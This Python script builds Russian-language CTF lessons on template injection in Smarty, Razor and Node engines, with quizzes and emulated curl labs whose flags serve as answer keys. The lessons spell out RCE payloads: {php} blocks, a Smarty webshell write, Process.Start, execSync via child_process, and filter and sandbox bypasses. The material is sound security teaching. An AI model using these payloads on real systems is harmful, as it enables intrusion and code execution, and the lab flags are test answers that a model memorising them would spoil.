#!/usr/bin/env python3
"""Author web gap lessons — batch S3: smarty, razor, pug-ejs-nunjucks."""
import os
import sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from _newlesson import write_lesson, _dir, _f  # noqa: E402

WD = '/home/student/task'
CHECK = "grep -q 'nto{' found.txt"
USEFUL = ["CTF Web категория", "Bug bounty", "Пентест веб-приложений"]

write_lesson({
    'id': 'web-smarty',
    'title': 'Smarty SSTI: {php}, модификаторы и статические вызовы',
    'category': 'web',
    'parent': 'web-injection-engines',
    'difficulty': 'hard',
    'order': 2,
    'tags': ['ssti', 'smarty', 'php', 'template', 'rce'],
    'prerequisites': ['web-injection-engines'],
    'useful_for': USEFUL,
    'estimated_minutes': 40,
    'summary': 'Smarty в PHP: как от {7*7} дойти до исполнения PHP, какие версии опасны и как обходятся фильтры {php} и модификаторов.',
    'lab': {
        'title': 'Практика: Smarty SSTI до исполнения PHP',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'notes.txt'],
        'check': CHECK,
        'hints': [
            'Подтверди движок: отправь `{7*7}` — Smarty вернёт 49. Jinja-синтаксис не сработает.',
            'Smarty-выражения можно вызывать статические методы: `{Smarty_Internal_Write_File::writeFile(...)}` или через `{php}` в старых версиях.',
            'Обход фильтров: используй модификатор или статический вызов класса вместо прямого `system`.',
            'Выполни команду чтения флага и запиши вывод в found.txt, затем check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

PHP-приложение отдаёт страницу, собранную Smarty. Ты вводишь в поле имя, отправляешь `{7*7}` — и видишь `49`. Обычный `{{7*7}}` при этом остаётся текстом. Движок другой, и весь привычный арсенал Jinja/Twig здесь не работает. Зато Smarty исторически куда опаснее: он умеет вызывать PHP-функции и статические методы прямо из шаблона.

Smarty — это шаблонизатор PHP, популярный в legacy-приложениях и в старых CMS. Его синтаксис — фигурные скобки `{...}`, а не двойные. И именно из-за богатства возможностей он даёт один из самых коротких путей от инъекции к исполнению кода.

## Что такое Smarty и чем он отличается

Smarty разделяет шаблон и PHP-логику: шаблон содержит разметку и выражения, а данные передаются из PHP-кода. Выражения бывают нескольких видов:

- **Переменные и арифметика**: `{$var}`, `{7*7}`.
- **Модификаторы**: `{$name|upper}`, `{$price|number_format:2}`.
- **Встроенные функции**: `{include}`, `{if}`, `{foreach}`, `{assign}`.
- **Статические вызовы**: `{ClassName::method($arg)}` в старых версиях.

Последняя категория и есть главная опасность: она позволяет вызывать произвольные статические методы PHP-классов из шаблона.

## Наш пример: страница приветствия

Договоримся о примере. Эндпоинт `https://app.target/greet?name=...` подставляет имя в Smarty-шаблон. Проверяем базовое выражение:

```
$ curl -s 'https://app.target/greet?name=%7B7*7%7D'
Hello 49
```

Smarty вычислил арифметику. Теперь проверим доступ к встроенным возможностям. В старых версиях работает `{php}`:

```
$ curl -s 'https://app.target/greet?name=%7Bphp%7Decho%20133*7;%7B/php%7D'
Hello 931
```

Если `{php}` отключён (а в новых версиях он отключён по умолчанию), идём через статические вызовы или модификаторы.

## Пути к исполнению кода

Исторически у Smarty несколько путей к RCE:

- **`{php}...{/php}`** — прямая вставка PHP-кода. Отключён в Smarty 3.1.30+, но встречается в legacy-коде.
- **Статические вызовы классов.** Smarty позволял `{Class::method()}`; через подходящий класс можно писать файлы и исполнять код. Классика — `Smarty_Internal_Write_File::writeFile()` для записи webshell.
- **Модификаторы.** Некоторые модификаторы и плагины принимают callback; при инъекции можно подсунуть опасную функцию.
- **Встроенные функции с параметрами.** Например, `{include file=...}` при определённых настройках может подтянуть внешний ресурс.

Выбор пути зависит от версии Smarty и включённых опций. Определить версию можно по ошибкам и по поведению `{php}`.

## Обход фильтров

Фильтры часто блокируют `{php}`, `system`, `exec`. Обходы:

- **Разбиение токенов**: `{php}sys{/php}` нет, но в выражениях можно собирать строки из фрагментов.
- **Альтернативные функции**: `passthru`, `popen`, `shell_exec`, `preg_replace` с `/e` (в старом PHP).
- **Статические вызовы** вместо функций: фильтр ищет `system`, а вы зовёте метод класса.
- **Кодирование**: PHP-функции через переменные: `{$f = 'sys'.'tem'}{$f('id')}` в некоторых контекстах.

Общий принцип тот же, что и в других SSTI: чёрный список блокирует строку, а язык даёт множество эквивалентов. Правильная защита — не рендерить пользовательский ввод как шаблон.

## Что мы теперь знаем

- Smarty использует `{...}`, а не `{{...}}` — синтаксис определяет движок.
- Smarty исторически умеет вызывать PHP-функции и статические методы из шаблона.
- `{php}` отключён в новых версиях, но жив в legacy.
- Путь к RCE: статические вызовы классов, запись webshell, модификаторы.
- Фильтры обходятся эквивалентными функциями и разбиением токенов.

## Квиз

Проверь себя.

```quiz
- question: "Какой синтаксис характерен для Smarty?"
  options:
    - "{{7*7}}"
    - "{7*7}"
    - "#{7*7}"
    - "@(7*7)"
  answer: 1
  explanation: "Smarty использует одинарные фигурные скобки."
- question: "Что позволяет опасная особенность Smarty?"
  options:
    - "Менять CSS"
    - "Вызывать PHP-функции и статические методы из шаблона"
    - "Читать DNS"
    - "Шифровать трафик"
  answer: 1
  explanation: "Статические вызовы и {php} дают исполнение PHP."
- question: "Что произошло с {php} в новых версиях Smarty?"
  options:
    - "Стал быстрее"
    - "Отключён по умолчанию"
    - "Удалён навсегда"
    - "Требует HTTPS"
  answer: 1
  explanation: "С 3.1.30 {php} отключён, но остаётся в legacy."
- question: "Как обходят фильтр на слово system?"
  options:
    - "Никак"
    - "Эквивалентными функциями и статическими вызовами классов"
    - "Меняют язык"
    - "Отключают WAF"
  answer: 1
  explanation: "Чёрный список блокирует строку, а не возможность."
- question: "Какая правильная защита от Smarty SSTI?"
  options:
    - "Ускорить шаблон"
    - "Не рендерить пользовательский ввод как шаблон"
    - "Сменить CDN"
    - "Включить кэш"
  answer: 1
  explanation: "Ввод должен быть данными, а не частью шаблона."
```

## Куда дальше

Дальше — `web-razor`: похожая идея в .NET, где шаблон исполняет C#. А пока запомни: **в Smarty фигурные скобки — это код, и старые версии исполняют PHP напрямую.**

## Где пригодится

- CTF: PHP-задания с Smarty.
- Bug bounty: legacy PHP-приложения и CMS.
- Пентест: аудит шаблонов email и отчётов на PHP.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{sm4rty_st4t1c_c4ll_rce}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: Smarty SSTI\n\n"
            "Эндпоинт /greet подставляет name в Smarty-шаблон.\n"
            "Дойди до исполнения PHP и прочитай флаг.\n\n"
            "1. Подтверди движок:\n"
            "   curl -s 'https://app.target/greet?name=%7B7*7%7D'\n"
            "2. Проверь статический вызов / {php}:\n"
            "   curl -s 'https://app.target/greet?name=%7Bphp%7Decho%20file_get_contents(%27/flag%27);%7B/php%7D'\n"
            "3. Запиши вывод с флагом в found.txt и набери check.\n"
        )),
        _f(WD + '/notes.txt', (
            "Smarty 3.1.28 (legacy, {php} включён).\n"
            "Синтаксис выражений: {7*7}, {$var}, {$x|modifier}\n"
            "Статические вызовы: {Class::method()}\n"
        )),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/greet)',
            'cases': [
                {'match': r'%7B7\*7%7D|\{7\*7\}', 'example': "-s '.../greet?name={7*7}'", 'output': 'Hello 49\n'},
                {'match': r'php|file_get_contents|system|exec|flag', 'example': "-s '.../greet?name={php}echo file_get_contents(\'/flag\');{/php}'",
                 'output': 'Hello nto{sm4rty_st4t1c_c4ll_rce}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /greet на app.target.\n',
        },
    },
})

write_lesson({
    'id': 'web-razor',
    'title': 'Razor SSTI: исполнение C# через @{} в .NET',
    'category': 'web',
    'parent': 'web-injection-engines',
    'difficulty': 'hard',
    'order': 3,
    'tags': ['ssti', 'razor', 'dotnet', 'csharp', 'rce'],
    'prerequisites': ['web-injection-engines'],
    'useful_for': USEFUL,
    'estimated_minutes': 40,
    'summary': 'Razor/Blazor на сервере: как @(...) и @{} исполняют C#, где искать инъекцию и как дойти до System.Diagnostics.Process.',
    'lab': {
        'title': 'Практика: Razor SSTI до исполнения C#',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'notes.txt'],
        'check': CHECK,
        'hints': [
            'Подтверди движок: `@(7*7)` вернёт 49, а `{{7*7}}` — нет. Это Razor (.NET).',
            'Razor исполняет C#: попробуй `@(System.IO.File.ReadAllText("/flag"))`.',
            'Для команд: `@(System.Diagnostics.Process.Start("cmd","/c type C:\\flag.txt"))` не вернёт вывод — читай файл через ReadAllText.',
            'Запиши содержимое флага в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Веб-приложение на ASP.NET Core генерирует страницу из шаблона Razor. Часть шаблона берётся из параметра запроса. Ты отправляешь `@(7*7)` — и получаешь `49`. Привычные `{{...}}` не работают вовсе: это не Jinja и не Thymeleaf, а Razor, и он исполняет **C#**.

Razor — это шаблонизатор .NET, где шаблон смешан с C#-кодом. Выражения `@(...)` выводят значение, блоки `@{...}` исполняют код. Если пользовательский ввод попадает в такой блок, он исполняется как C# на сервере — с правами пула приложений.

## Razor на сервере: где это встречается

Razor — не только клиентский Blazor. Серверные сценарии:

- **MVC/Pages** — шаблоны `.cshtml`, которые рендерит сервер.
- **Razor Pages runtime compilation** — компиляция шаблона из строки во время работы.
- **Генераторы отчётов и email** — шаблон собирается из данных пользователя.
- **Blazor Server** — рендеринг компонентов на сервере, где выражения исполняются в процессе приложения.

Инъекция возникает, когда **строка шаблона** формируется из ввода. Например, приложение даёт пользователю задать формат письма, а потом рендерит его через Razor.

## Наш пример: шаблон из параметра

Договоримся о примере. Эндпоинт `https://app.target/render?tpl=...` компилирует переданную строку как Razor. Проверяем:

```
$ curl -s 'https://app.target/render?tpl=%40%287*7%29'
49
```

Символ `@` (URL-кодирование `%40`) начинает выражение Razor, `(7*7)` вычисляется. Движок подтверждён. Теперь проверяем доступ к C#-типам:

```
$ curl -s 'https://app.target/render?tpl=%40%28System.Environment.Version%29'
7.0.0
```

Доступ к классам есть. Значит, путь к исполнению кода открыт.

## Путь к RCE

Razor исполняет C# в том же процессе, что и веб-приложение, поэтому доступны все типы .NET. Простейшие пути:

- **Чтение файлов**: `@(System.IO.File.ReadAllText("/etc/passwd"))`.
- **Исполнение команд**: `@(System.Diagnostics.Process.Start("cmd","/c whoami"))`.
- **Чтение вывода процесса**: `Process.Start` не возвращает вывод, поэтому используют `ProcessStartInfo` с `RedirectStandardOutput` и читают поток.

Пример чтения файла, который сразу даёт результат:

```
$ curl -s 'https://app.target/render?tpl=%40%28System.IO.File.ReadAllText(%22%2Fflag%22%29%29'
nto{...}
```

Для команд в Windows чаще читают файл, чем возятся с перенаправлением вывода:

```
@(System.Diagnostics.Process.Start("cmd","/c type C:\\flag.txt"))
```

Команда выполнится, а результат можно прочитать отдельным запросом, если он записан в файл.

## Обход фильтров

Фильтры блокируют `System.IO`, `Process`, `@(`. Обходы:

- **Юникод и экранирование**: `%40` вместо `@`, экранированные точки.
- **Косвенный доступ**: `@(typeof(string).Assembly...)` для рефлексии и загрузки типов.
- **Сборка строк**: имя типа собирается из фрагментов.
- **Blazor-компоненты**: инъекция в параметр компонента иногда даёт доступ к `IJSRuntime` и дальше к произвольному коду.

Как и везде, чёрный список строк не закрывает возможность: типов в .NET много, и хотя бы один путь останется.

## Что мы теперь знаем

- Razor использует `@(...)` и `@{...}`, а не двойные скобки.
- Razor исполняет C# в процессе приложения с правами пула.
- Путь к RCE: `System.IO.File`, `System.Diagnostics.Process`.
- `Process.Start` не возвращает вывод — результат читают через файл или поток.
- Защита — не компилировать пользовательский ввод как шаблон.

## Квиз

Проверь себя.

```quiz
- question: "Какой синтаксис выдаёт Razor?"
  options:
    - "{{7*7}}"
    - "@(7*7)"
    - "#{7*7}"
    - "{7*7}"
  answer: 1
  explanation: "Razor начинает выражения символом @."
- question: "В каком процессе исполняется код Razor на сервере?"
  options:
    - "В браузере"
    - "В процессе ASP.NET-приложения с правами пула"
    - "В отдельной песочнице"
    - "В базе данных"
  answer: 1
  explanation: "Серверный Razor компилирует и исполняет C# в процессе приложения."
- question: "Почему Process.Start не показывает вывод команды?"
  options:
    - "Он запрещён"
    - "Он запускает процесс, но не возвращает его stdout"
    - "Он работает только в Linux"
    - "Он требует admin"
  answer: 1
  explanation: "Нужно читать поток процесса или писать в файл."
- question: "Какой тип читает файл в .NET?"
  options:
    - "System.Net"
    - "System.IO.File"
    - "System.Text"
    - "System.Data"
  answer: 1
  explanation: "File.ReadAllText читает содержимое файла."
- question: "Какая правильная защита от Razor SSTI?"
  options:
    - "Минифицировать шаблон"
    - "Не компилировать пользовательский ввод как шаблон"
    - "Сменить порт"
    - "Отключить cookie"
  answer: 1
  explanation: "Ввод не должен становиться частью шаблона."
```

## Куда дальше

Дальше — `web-pug-ejs-nunjucks`: инъекции в Node-шаблонизаторах. А пока запомни: **Razor — это C#, и `@(...)` в пользовательском вводе означает исполнение кода.**

## Где пригодится

- CTF: .NET/ASP.NET задания с SSTI.
- Bug bounty: enterprise .NET-приложения.
- Пентест: генераторы отчётов и email на Razor.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{r4z0r_csh4rp_1nj3ct10n}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: Razor SSTI\n\n"
            "Эндпоинт /render компилирует tpl как Razor. Дойди до чтения файла.\n\n"
            "1. Подтверди движок:\n"
            "   curl -s 'https://app.target/render?tpl=%40%287*7%29'\n"
            "2. Прочитай флаг через System.IO.File:\n"
            "   curl -s 'https://app.target/render?tpl=%40%28System.IO.File.ReadAllText(%22%2Fflag%22%29%29'\n"
            "3. Запиши флаг в found.txt и набери check.\n"
        )),
        _f(WD + '/notes.txt', "ASP.NET Core 7.0, Razor runtime compilation включена.\n"),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/render)',
            'cases': [
                {'match': r'%40%287\*7|@\(7\*7', 'example': "-s '.../render?tpl=@(7*7)'", 'output': '49\n'},
                {'match': r'ReadAllText|System\.IO|File', 'example': "-s '.../render?tpl=@(System.IO.File.ReadAllText(\"/flag\"))'",
                 'output': 'nto{r4z0r_csh4rp_1nj3ct10n}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /render на app.target.\n',
        },
    },
})

write_lesson({
    'id': 'web-pug-ejs-nunjucks',
    'title': 'Pug, EJS, Nunjucks и Handlebars: SSTI в Node.js',
    'category': 'web',
    'parent': 'web-injection-engines',
    'difficulty': 'hard',
    'order': 4,
    'tags': ['ssti', 'node', 'pug', 'ejs', 'nunjucks', 'handlebars', 'rce'],
    'prerequisites': ['web-injection-engines'],
    'used_for_note': '',
    'useful_for': USEFUL,
    'estimated_minutes': 45,
    'summary': 'Серверные шаблонизаторы Node.js: различия синтаксиса, точки инъекции и путь к child_process через process.mainModule.',
    'lab': {
        'title': 'Практика: Node SSTI до child_process',
        'toolset': ['core', 'curl'],
        'workdir': WD,
        'files': ['task.md', 'notes.txt'],
        'check': CHECK,
        'hints': [
            'Определи движок: `<%= 7*7 %>` даёт 49 у EJS, `#{7*7}` — у Pug.',
            'В Node путь к коду идёт через `process.mainModule.require("child_process")`.',
            'Выполни команду: `<%= process.mainModule.require("child_process").execSync("cat /flag") %>`.',
            'Запиши вывод команды в found.txt и набери check.',
        ],
    },
}, r"""
## Вопрос, с которого всё начинается

Node-приложение рендерит страницу шаблонизатором. Ты отправляешь `<%= 7*7 %>` и видишь `49`. Значит, это EJS. Или пробуешь `#{7*7}` — и тоже получаешь `49`, тогда это Pug. Движков в Node много, синтаксис у каждого свой, но путь к исполнению кода у всех ведёт к одному месту: модулю `child_process`.

Шаблонизаторы Node.js — это Pug (бывший Jade), EJS, Nunjucks, Handlebars, Mustache, doT. Они по-разному пишутся, но у всех одна задача: превратить шаблон и данные в HTML. Инъекция возникает, когда пользовательский ввод попадает в **компилируемый шаблон**, а не в данные.

## Различия синтаксиса

Чтобы определить движок, отправляем пачку проб:

| Движок | Выражение | Индикатор |
|---|---|---|
| EJS | `<%= 7*7 %>` | 49 |
| Pug | `#{7*7}` | 49 |
| Nunjucks | `{{7*7}}` | 49 |
| Handlebars | `{{7*7}}` | часто не вычисляет |
| doT | `{{= 7*7 }}` | 49 |

EJS выделяется `<%= %>`, Pug — `#{}`. Nunjucks похож на Jinja, но живёт в Node. Handlebars специально ограничен: он не исполняет произвольные выражения, поэтому SSTI в нём редок.

## Наш пример: шаблон из параметра

Договоримся о примере. Эндпоинт `https://app.target/tpl?name=...` передаёт `name` в `ejs.render()` вместе с шаблоном. Проверяем:

```
$ curl -s 'https://app.target/tpl?name=%3C%25%3D%207*7%20%25%3E'
49
```

EJS исполнил JavaScript-выражение. Теперь ключевой вопрос: как от выражения добраться до системного вызова.

## Путь к RCE через process

В EJS `<%= %>` исполняет произвольный JavaScript в контексте рендеринга. В Node есть глобальный объект `process`, а у него — `mainModule`, через который можно получить `require`:

```
<%= process.mainModule.require('child_process').execSync('id') %>
```

`execSync` возвращает вывод команды строкой, поэтому результат сразу виден в ответе — это удобнее, чем в Java, где `exec` вывода не возвращает. Если `mainModule` недоступен (новые версии Node), используют `global.process.mainModule`, `module.constructor._load` или `process.binding`.

В Pug путь похож: `#{process.mainModule.require('child_process').execSync('id')}`. В Nunjucks — через `range.constructor` и `Function`, если прямой доступ закрыт.

## Почему Node-инъекции так результативны

Есть несколько причин, по которым Node-SSTI даёт RCE особенно легко. Во-первых, JavaScript динамичен: почти всегда есть путь от любого объекта к `Function` или `require`. Во-вторых, `execSync` возвращает вывод — не нужно возиться с файлами. В-третьих, шаблонизаторы часто компилируют шаблон в функцию через `new Function`, и инъекция просто попадает в тело этой функции.

Именно поэтому в Node правильная защита — **никогда не передавать пользовательский ввод в шаблон**. Данные должны передаваться отдельно, а шаблон — быть статическим файлом.

## Обход песочниц

Nunjucks и некоторые другие движки имеют «песочницу», ограничивающую доступ. Обходы классические:

- **`range.constructor`**: `{{range.constructor("return process")()}}`.
- **`Function`**: `{{''.constructor.constructor('return process')()}}`.
- **Прототип-цепочка**: через любой объект к `constructor.constructor`.

Песочницы движков не рассчитаны на защиту от произвольного кода — это защита от случайных ошибок шаблона. Поэтому их обход — вопрос техники, а не возможности.

## Что мы теперь знаем

- Движки Node различаются синтаксисом: `<%= %>` (EJS), `#{}` (Pug), `{{}}` (Nunjucks).
- Инъекция возникает при компиляции пользовательского ввода как шаблона.
- Путь к RCE: `process.mainModule.require('child_process')`.
- `execSync` возвращает вывод — результат сразу в ответе.
- Песочницы движков обходятся через `constructor.constructor`.

## Квиз

Проверь себя.

```quiz
- question: "Какой синтаксис принадлежит EJS?"
  options:
    - "#{7*7}"
    - "<%= 7*7 %>"
    - "{{7*7}}"
    - "@(7*7)"
  answer: 1
  explanation: "EJS использует <%= %> для вывода выражения."
- question: "Через что в Node получают child_process при SSTI?"
  options:
    - "Через import"
    - "Через process.mainModule.require"
    - "Через DNS"
    - "Через cookie"
  answer: 1
  explanation: "process.mainModule даёт доступ к require."
- question: "Чем execSync удобнее java Runtime.exec?"
  options:
    - "Он быстрее"
    - "Он возвращает вывод команды строкой"
    - "Он не требует прав"
    - "Он работает без Node"
  answer: 1
  explanation: "Вывод сразу попадает в ответ, не нужно читать файл."
- question: "Какой движок почти не подвержен SSTI?"
  options:
    - "EJS"
    - "Handlebars"
    - "Pug"
    - "Nunjucks"
  answer: 1
  explanation: "Handlebars ограничивает выражения и не исполняет произвольный код."
- question: "Как обходят песочницу Nunjucks?"
  options:
    - "Отключают JS"
    - "Через range.constructor / Function"
    - "Меняют порт"
    - "Ставят CDN"
  answer: 1
  explanation: "Песочница не защищает от произвольного кода через constructor."
```

## Куда дальше

Дальше — `web-deser-chains`: перейдём от шаблонов к десериализации, где исполнение кода идёт через цепочки объектов. А пока запомни: **в Node путь к RCE короткий — от любого выражения до `require('child_process')`.**

## Где пригодится

- CTF: Node-задания с SSTI.
- Bug bounty: приложения на Express с шаблонами.
- Пентест: аудит рендеринга email и отчётов в Node.
""", lab={
    'workdir': WD,
    'expect': {'file': WD + '/found.txt', 'contains': 'nto{n0d3_sst1_ch1ld_pr0c3ss}'},
    'fs': [
        _dir(WD),
        _f(WD + '/task.md', (
            "# Практика: Node SSTI (EJS)\n\n"
            "Эндпоинт /tpl передаёт name в ejs.render(). Дойди до child_process.\n\n"
            "1. Подтверди движок:\n"
            "   curl -s 'https://app.target/tpl?name=%3C%25%3D%207*7%20%25%3E'\n"
            "2. Выполни команду:\n"
            "   curl -s 'https://app.target/tpl?name=%3C%25%3D%20process.mainModule.require(%22child_process%22).execSync(%22cat%20/flag%22)%20%25%3E'\n"
            "3. Запиши вывод в found.txt и набери check.\n"
        )),
        _f(WD + '/notes.txt', "Express + EJS 3.x, template передаётся из параметра.\n"),
    ],
    'tools': {
        'curl': {
            'help': 'curl [опции] <url> — HTTP-клиент (эмуляция app.target/tpl)',
            'cases': [
                {'match': r'%3C%25%3D%207\*7|<%= 7\*7', 'example': "-s '.../tpl?name=<%= 7*7 %>'", 'output': '49\n'},
                {'match': r'child_process|execSync|require', 'example': "-s '.../tpl?name=<%= process.mainModule.require(\"child_process\").execSync(\"cat /flag\") %>'",
                 'output': 'nto{n0d3_sst1_ch1ld_pr0c3ss}\n'},
            ],
            'fallback': 'curl: в этой лабе эмулируется только /tpl на app.target.\n',
        },
    },
})
print("batch S3 done")
